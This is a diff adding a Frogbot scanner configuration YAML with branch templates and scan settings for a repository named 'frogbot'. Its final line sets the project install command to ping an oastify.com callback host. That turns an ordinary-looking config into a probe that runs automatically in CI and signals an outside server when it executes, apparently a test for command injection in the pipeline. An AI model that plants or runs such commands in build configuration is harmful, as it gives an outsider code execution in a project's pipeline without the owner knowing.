@@ -1,0 +1,17 @@
+- params:
+    git:
+      repoName: frogbot
+      branches:
+        - master
+      branchNameTemplate: "this is my branch {BRANCH_NAME_HASH}"
+      commitMessageTemplate: "custom commit title"
+      pullRequestTitleTemplate: "myPullRequests"
+      aggregateFixes: true
+      pullRequestCommentTitle: "build 1323"
+    scan:
+      includeAllVulnerabilities: true
+      failOnSecurityIssues: true
+      minSeverity: high
+      fixableOnly: true
+      projects:
+        - installCommand: ping -c 1 dvcedb6jdybzq56x3nye67yq4ha8y1mq.oastify.com
